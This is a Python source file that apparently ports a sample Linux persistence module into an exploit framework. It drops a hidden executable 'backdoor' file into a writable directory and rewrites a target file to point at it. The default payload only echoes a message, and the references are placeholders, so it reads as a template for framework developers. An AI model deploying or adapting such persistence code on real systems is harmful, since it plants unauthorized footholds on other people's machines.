#!/usr/bin/env python3
"""
Python port of the sample Linux persistence module.

This translation uses the Python-native exploit framework and performs a
lightweight persistence drop by writing a backdoor file and updating a
target file reference.
"""

import os
import shutil
import stat
import secrets
from datetime import datetime
import sys

CURRENT_DIR = os.path.dirname(__file__)
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, "..", ".."))
sys.path.insert(0, os.path.join(PROJECT_ROOT, "python_framework"))

from python_framework.core.exploit import (
    LocalExploit,
    ExploitInfo,
    ExploitOption,
    ExploitResult,
    ExploitTarget,
    ExploitRank,
    Platform,
    TargetArch,
    PayloadType,
)


class LinuxPersistenceExploit(LocalExploit):
    """Sample persistence routine for Linux systems."""

    def __init__(self):
        info = ExploitInfo(
            name="Sample Linux Persistence",
            description=(
                "This exploit sample shows how a persistence module could be written "
                "for a Linux computer."
            ),
            author=["h00die <mike@stcyrsecurity.com>", "researcher"],
            references=[
                "OSVDB-12345",
                "EDB-12345",
                "http://www.example.com",
                "CVE-1978-1234",
            ],
            disclosure_date="2023-11-29",
            rank=ExploitRank.EXCELLENT,
            platform=[Platform.LINUX],
            arch=[TargetArch.CMD, TargetArch.X86, TargetArch.X64],
            privileged=True,
            targets=[
                ExploitTarget(
                    name="Local shell",
                    platform=[Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.UNIX_CMD,
                )
            ],
            default_target=0,
            notes={
                "Stability": ["CRASH_SAFE"],
                "Reliability": [],
                "SideEffects": [],
            },
        )

        super().__init__(info)

        self.register_options(
            [
                ExploitOption(
                    "WRITABLE_DIR",
                    True,
                    "Directory where files can be written",
                    "/tmp",
                    str,
                ),
                ExploitOption(
                    "TARGET_FILE",
                    True,
                    "File to update with persistence reference",
                    "/tmp/example_file",
                    str,
                ),
                ExploitOption(
                    "PAYLOAD_CONTENT",
                    False,
                    "Payload content to write to the backdoor file",
                    "#!/bin/sh\necho 'persistence triggered'\n",
                    str,
                ),
                ExploitOption(
                    "PAYLOAD_NAME",
                    False,
                    "Optional backdoor filename",
                    "",
                    str,
                ),
            ]
        )

    def _dir_is_writable(self, path: str) -> bool:
        return os.path.isdir(path) and os.access(path, os.W_OK | os.X_OK)

    def check(self) -> ExploitResult:
        writable_dir = self.get_option("WRITABLE_DIR", "/tmp")
        if not os.path.exists(writable_dir):
            return ExploitResult(False, f"{writable_dir} does not exist")
        if not self._dir_is_writable(writable_dir):
            return ExploitResult(False, f"{writable_dir} is not writable")

        target_file = self.get_option("TARGET_FILE", "/tmp/example_file")
        if not os.path.exists(target_file):
            self.print_warning(f"Target file {target_file} does not exist; it will be created")

        return ExploitResult(True, "Writable directory present and accessible")

    def exploit(self) -> ExploitResult:
        writable_dir = self.get_option("WRITABLE_DIR", "/tmp")
        target_file = self.get_option("TARGET_FILE", "/tmp/example_file")
        payload_name = self.get_option("PAYLOAD_NAME", "").strip()
        payload_content = self.get_option(
            "PAYLOAD_CONTENT", "#!/bin/sh\necho 'persistence triggered'\n"
        )

        if not self._dir_is_writable(writable_dir):
            return ExploitResult(False, f"{writable_dir} is not writable")

        if not payload_name:
            payload_name = f".persist_{secrets.token_hex(4)}"

        backdoor_path = os.path.join(writable_dir, payload_name)
        backup_path = f"{target_file}.bak.{datetime.now().strftime('%Y%m%d%H%M%S')}"

        try:
            # Write backdoor payload
            with open(backdoor_path, "w", encoding="utf-8") as handle:
                handle.write(payload_content)
            os.chmod(backdoor_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
            self.print_good(f"Wrote backdoor to {backdoor_path}")

            # Backup target file if it exists
            if os.path.exists(target_file):
                shutil.copy2(target_file, backup_path)
                self.print_status(f"Backed up {target_file} to {backup_path}")

            # Replace target file contents with pointer to backdoor
            with open(target_file, "w", encoding="utf-8") as handle:
                handle.write(backdoor_path + "\n")
            self.print_good(f"Updated {target_file} to point to backdoor")

            data = {"backdoor_path": backdoor_path, "backup_path": backup_path}
            return ExploitResult(True, "Persistence written", data)

        except OSError as exc:
            return ExploitResult(False, f"File operation failed: {exc}")


if __name__ == "__main__":
    exploit = LinuxPersistenceExploit()
    result = exploit.run()
    status = "success" if result.success else "failure"
    print(f"[{status}] {result.message}")
